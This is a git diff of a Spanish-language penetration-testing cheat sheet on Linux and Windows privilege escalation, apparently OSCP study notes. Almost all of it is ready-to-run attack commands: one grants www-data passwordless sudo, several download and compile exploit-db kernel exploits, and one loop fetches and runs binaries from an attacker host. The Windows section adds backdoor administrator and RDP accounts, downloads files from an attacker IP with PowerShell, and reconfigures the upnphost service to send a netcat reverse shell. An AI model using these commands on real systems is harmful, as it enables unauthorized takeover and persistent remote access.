@@ -1,4 +1,7 @@
-# Elevacion de privilegios
+Linux: https://github.com/pedroarias1015/oscp/blob/master/escalacion/README.md#elevacion-de-privilegios-linux
+Windows: https://github.com/pedroarias1015/oscp/blob/master/escalacion/README.md#elevacion-de-privilegios-windows
+
+# Elevacion de privilegios LINUX
 
 ## Spawing shell
 
@@ -51,34 +54,96 @@ Permisos de R    -->  find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -p
 
 16) Añadir al usuario www-data a sudoers sin password --> `echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update`
 
+17) Compartir carpeta RDP --> `rdesktop -u <USUARIO> -p <CONTRASEÑA> <IP> -r disk:remote_folder=<LOCAL_PATH> -g $(xrandr -q | awk '/ connected / {print $4;exit}' | awk -F "x" '{print int($1/1.05)"x"int($2/1.1)}')`
+
 
 ## Compilacion
 
-17) Incluir path --> `gcc -B /usr/bin file.c -o compiled`
+18) Incluir path --> `gcc -B /usr/bin file.c -o compiled`
 
-18) Solucionar error de target  --> `gcc file.c -o compiled -Wl,--hash-style=both`
+19) Solucionar error de target  --> `gcc file.c -o compiled -Wl,--hash-style=both`
 
 ## Exploits satisfactorios
 
-19) __Exploits precompilados para Linux__ https://github.com/lucyoa/kernel-exploits  `git clone https://github.com/lucyoa/kernel-exploits.git` 
+20) __Exploits precompilados para Linux__ https://github.com/lucyoa/kernel-exploits  `git clone https://github.com/lucyoa/kernel-exploits.git` 
 
-20) __CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8__ https://www.exploit-db.com/exploits/15285
+21) __CLAVE: Windows exploits precompilados__ https://github.com/SecWiki/windows-kernel-exploits
 
-21) __Linux Kernel <= 2.6.37 'Full-Nelson.c'__ https://www.exploit-db.com/exploits/15704/
+22) __CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8__ https://www.exploit-db.com/exploits/15285
 
-22) __CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)__ https://git.zx2c4.com/CVE-2012-0056/about/
+23) __Linux Kernel <= 2.6.37 'Full-Nelson.c'__ https://www.exploit-db.com/exploits/15704/
 
-23) __Linux CVE 2012-0056__ `wget -O mem.c http://www.exploit-db.com/download/18411; gcc -o mem mem.c`
+24) __CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)__ https://git.zx2c4.com/CVE-2012-0056/about/
 
-24) __CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8__ https://dirtycow.ninja/ `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`
+25) __Linux CVE 2012-0056__ `wget -O mem.c http://www.exploit-db.com/download/18411; gcc -o mem mem.c`
+
+26) __CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8__ https://dirtycow.ninja/ `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`
 `wget https://www.exploit-db.com/download/40839 -O dirty.c; gcc -pthread dirty.c -o dirty -lcrypt`
 
-25) __Linux 2.6.32__ https://www.exploit-db.com/exploits/15285/ 
+27) __Linux 2.6.32__ https://www.exploit-db.com/exploits/15285/ 
 
-26) __CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)__ 
+28) __CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)__ 
 <pre>
 wget -O 14814.c http://www.exploit-db.com/download/14814
 gcc 14814.c -o can
 </pre>
 
-27) __Elevation in 2.6.x__ `for a in 9352 9513 33321 15774 15150 15944 9543 33322 9545 25288 40838 40616 40611 ; do wget http://$LHOST/$a; chmod +x $a; ./$a; id; done`
+29) __Elevation in 2.6.x__ `for a in 9352 9513 33321 15774 15150 15944 9543 33322 9545 25288 40838 40616 40611 ; do wget http://$LHOST/$a; chmod +x $a; ./$a; id; done`
+
+# Elevacion de privilegios WINDOWS
+
+## Reconocimiento automatico
+
+30) Windows Exploit Sugester
+<pre>
+cp $OSCP/escalacion/windows-exploit-suggester.py wes.py
+python wes.py -d 2017-05-27-mssb.xls -i systeminfo.txt
+</pre>
+
+## Utilidades
+
+31) Ejecución de script en powershell sin tener que abrir una shell de powershell
+<pre>
+powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+</pre>
+
+32) Añadir usuario administrador y con acceso remoto (RDP):
+<pre>
+net user /add <USERNAME> <PASSWORD>
+net localgroup administrators <USERNAME> /add
+NET LOCALGROUP "Remote Desktop Users" <USERNAME> /ADD
+</pre>
+
+33) Descargar ficheros con powershell
+<pre>
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://IP_ATACANTE:PUERTO/FICHERO','C:\Users\Public\FICHERO')"
+</pre>
+
+## Exploits satisfactorios
+
+34) Windows Server 2003 and IIS 6.0 (Churrasco)
+<pre>
+Uso: Churrasco.exe -d "CMD COMO ADMIN"
+
+Ejemplo (crear un usuario administrador para acceder mediante RDP):
+Churrasco.exe -d "net user /add <USERNAME> <PASSWORD>"
+Churrasco.exe -d "net localgroup administrators <USERNAME> /add"
+Churrasco.exe -d "NET LOCALGROUP "Remote Desktop Users" <USERNAME> /ADD"
+</pre>
+  
+35) Windows XP SP1 (upnphost)
+<pre>
+En primer lugar, es necesario subir el fichero nc.exe a la máquina mediante FTP por ejemplo
+
+Ponemos a la escucha nuestra máquina: nc -nvlp <PUERTO>
+sc config upnphost binpath= "C:\Inetpub\nc.exe <IP ATACANTE> <PUERTO> -e C:\WINDOWS\System32\cmd.exe" 
+sc config upnphost obj= ".\LocalSystem" password= "" 
+sc qc upnphost
+If it fails because of a missing dependency, run the following:
+sc config SSDPSRV start= auto 
+net start SSDPSRV
+net start upnphost
+</pre>
+
+## Utilidades
+36) Ejemplo escapado de caracteres en Windows --> `echo net user rady rady /add 1^> "C:\Documents and Settings\Backup\net4.log" 2^>^&1 > backup-python.cmd`
